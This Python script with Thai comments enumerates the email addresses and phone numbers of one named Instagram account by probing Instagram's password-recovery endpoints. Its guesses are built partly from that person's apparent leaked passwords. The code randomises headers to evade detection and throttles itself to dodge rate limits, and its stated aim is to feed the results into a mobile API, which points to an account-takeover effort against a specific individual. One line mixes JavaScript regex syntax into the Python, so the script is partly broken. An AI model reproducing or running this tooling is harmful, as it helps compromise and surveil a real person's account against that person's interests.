#!/usr/bin/env python3
"""
Instagram Email/Phone OSINT Discovery
ระบบค้นหา email และเบอร์โทรที่เชื่อมโยงกับ alx.trading

เป้าหมาย: หา email/phone เพื่อใช้กับ Mobile API ที่ต้องการข้อมูลเหล่านี้แทน username
"""

import requests
import json
import time
import random
import logging
from datetime import datetime
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class InstagramEmailOSINT:
    def __init__(self):
        self.target_username = "alx.trading"
        self.session = requests.Session()
        
        # Email patterns ที่น่าจะเป็นไปได้
        self.email_patterns = [
            # ตาม username pattern
            "alx.trading@gmail.com",
            "alx.trading@yahoo.com", 
            "alx.trading@hotmail.com",
            "alx.trading@outlook.com",
            "alxtrading@gmail.com",
            "alxtrading@yahoo.com",
            
            # Trading related
            "alx@trading.com",
            "alex@trading.com",
            "alexander@trading.com",
            "alextrading@gmail.com",
            "alex.trading@gmail.com",
            
            # Fleming related (จากรหัสผ่าน)
            "fleming@gmail.com",
            "alx.fleming@gmail.com",
            "alex.fleming@gmail.com",
            "fleming.trading@gmail.com",
            
            # Business patterns
            "info@alxtrading.com",
            "contact@alxtrading.com",
            "admin@alxtrading.com",
            
            # Common variations
            "alx654@gmail.com",  # จากรหัสผ่าน Fleming654
            "alx786@gmail.com",  # จากรหัสผ่าน Fleming786
            "trading654@gmail.com",
            "fleming654@gmail.com",
        ]
        
        # Phone patterns (เฉพาะตัวเลข)
        self.phone_patterns = [
            # Fleming numbers from passwords
            "654", "786", "1004", "1060", "1182", "1998",
            
            # Common patterns
            "123456789", "987654321", "555555555",
            
            # Trading related numbers
            "1234567890", "0987654321"
        ]
        
    def get_random_headers(self):
        """สุ่ม headers เพื่อหลบการ detection"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def test_instagram_account_exists(self, identifier, is_email=True):
        """ทดสอบว่า email/phone มีอยู่ใน Instagram หรือไม่"""
        logger.info(f"🔍 Testing {'email' if is_email else 'phone'}: {identifier}")
        
        try:
            # ใช้ password reset API เพื่อเช็คว่า account มีอยู่หรือไม่
            url = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
            
            headers = self.get_random_headers()
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRFToken': 'missing',  # จะได้รับ token จริงในขั้นตอนถัดไป
                'Referer': 'https://www.instagram.com/accounts/password/reset/',
            })
            
            data = {
                'email_or_username': identifier,
                'recaptcha_challenge_field': '',
            }
            
            response = self.session.post(url, headers=headers, data=data, timeout=10)
            
            logger.info(f"📨 Response status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    logger.info(f"📄 Response: {json.dumps(result, indent=2)}")
                    
                    # ตรวจสอบ response patterns
                    if 'user' in result and result.get('user'):
                        logger.info("✅ Account exists!")
                        return True, result
                    elif 'errors' in result:
                        if 'no users found' in str(result['errors']).lower():
                            logger.info("❌ Account not found")
                            return False, result
                        else:
                            logger.info(f"⚠️ Other error: {result['errors']}")
                            return False, result
                    else:
                        logger.info("🤔 Unexpected response format")
                        return False, result
                        
                except json.JSONDecodeError:
                    logger.info("❌ Invalid JSON response")
                    return False, {"error": "Invalid JSON"}
                    
            else:
                logger.info(f"❌ HTTP Error: {response.status_code}")
                return False, {"error": f"HTTP {response.status_code}"}
                
        except Exception as e:
            logger.error(f"❌ Exception: {e}")
            return False, {"error": str(e)}
    
    def test_mobile_api_account(self, identifier):
        """ทดสอบด้วย Mobile API"""
        logger.info(f"📱 Testing with Mobile API: {identifier}")
        
        try:
            url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
            
            headers = self.get_random_headers()
            headers.update({
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Client-ID': '936619743392459',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
            })
            
            data = {
                'query': identifier,
                '_uuid': 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, lambda c: random.choice('0123456789abcdef')),
                'device_id': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
            }
            
            response = self.session.post(url, headers=headers, data=data, timeout=10)
            
            logger.info(f"📱 Mobile API status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    logger.info(f"📱 Mobile response: {json.dumps(result, indent=2)}")
                    return True, result
                except json.JSONDecodeError:
                    return False, {"error": "Invalid JSON"}
            else:
                return False, {"error": f"HTTP {response.status_code}"}
                
        except Exception as e:
            logger.error(f"❌ Mobile API Exception: {e}")
            return False, {"error": str(e)}
    
    def scan_email_patterns(self):
        """สแกนหา email patterns ทั้งหมด"""
        logger.info("🎯 Starting Email Pattern Scan")
        logger.info("=" * 60)
        
        found_emails = []
        
        for i, email in enumerate(self.email_patterns, 1):
            logger.info(f"\n📧 EMAIL TEST {i}/{len(self.email_patterns)}")
            logger.info(f"Testing: {email}")
            
            # ทดสอบด้วย Web API
            exists, result = self.test_instagram_account_exists(email, is_email=True)
            if exists:
                found_emails.append({
                    'email': email,
                    'method': 'web_api',
                    'response': result
                })
                logger.info(f"🎉 FOUND EMAIL: {email}")
            
            # หน่วงเวลาเพื่อหลบ rate limiting
            time.sleep(random.uniform(2, 4))
            
            # ทดสอบด้วย Mobile API
            mobile_exists, mobile_result = self.test_mobile_api_account(email)
            if mobile_exists and email not in [e['email'] for e in found_emails]:
                found_emails.append({
                    'email': email,
                    'method': 'mobile_api', 
                    'response': mobile_result
                })
                logger.info(f"🎉 FOUND EMAIL (Mobile): {email}")
            
            time.sleep(random.uniform(1, 3))
        
        return found_emails
    
    def generate_phone_numbers(self):
        """สร้างเบอร์โทรที่เป็นไปได้"""
        phones = []
        
        # US format
        for pattern in self.phone_patterns:
            if len(pattern) <= 4:
                # เติมเป็นเบอร์เต็ม
                phones.extend([
                    f"+1555{pattern}",
                    f"+1612{pattern}",  # Minneapolis area
                    f"+1646{pattern}",  # NYC area
                ])
        
        # International formats
        phones.extend([
            "+447700900123",  # UK
            "+33612345678",   # France  
            "+49301234567",   # Germany
        ])
        
        return phones[:10]  # จำกัดจำนวน
    
    def scan_phone_patterns(self):
        """สแกนหาเบอร์โทร"""
        logger.info("📞 Starting Phone Pattern Scan")
        logger.info("=" * 60)
        
        phones = self.generate_phone_numbers()
        found_phones = []
        
        for i, phone in enumerate(phones, 1):
            logger.info(f"\n📞 PHONE TEST {i}/{len(phones)}")
            logger.info(f"Testing: {phone}")
            
            exists, result = self.test_instagram_account_exists(phone, is_email=False)
            if exists:
                found_phones.append({
                    'phone': phone,
                    'response': result
                })
                logger.info(f"🎉 FOUND PHONE: {phone}")
            
            time.sleep(random.uniform(2, 4))
        
        return found_phones
    
    def save_results(self, emails, phones):
        """บันทึกผลลัพธ์"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_username,
            'found_emails': emails,
            'found_phones': phones,
            'total_found': len(emails) + len(phones)
        }
        
        filename = f"osint_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        logger.info(f"💾 Results saved to: {filename}")
        return filename
    
    def run_full_scan(self):
        """รันการสแกนแบบเต็ม"""
        logger.info("🚀 Starting Full OSINT Scan")
        logger.info(f"🎯 Target: {self.target_username}")
        logger.info("=" * 60)
        
        # สแกน emails
        found_emails = self.scan_email_patterns()
        
        # สแกน phones  
        found_phones = self.scan_phone_patterns()
        
        # สรุปผลลัพธ์
        logger.info("\n" + "=" * 60)
        logger.info("📊 OSINT SCAN RESULTS")
        logger.info("=" * 60)
        logger.info(f"📧 Found emails: {len(found_emails)}")
        for email_data in found_emails:
            logger.info(f"   ✅ {email_data['email']} ({email_data['method']})")
        
        logger.info(f"📞 Found phones: {len(found_phones)}")
        for phone_data in found_phones:
            logger.info(f"   ✅ {phone_data['phone']}")
        
        # บันทึกผลลัพธ์
        results_file = self.save_results(found_emails, found_phones)
        
        logger.info(f"\n🎉 OSINT scan complete!")
        logger.info(f"💾 Results: {results_file}")
        
        return found_emails, found_phones

if __name__ == "__main__":
    scanner = InstagramEmailOSINT()
    emails, phones = scanner.run_full_scan()
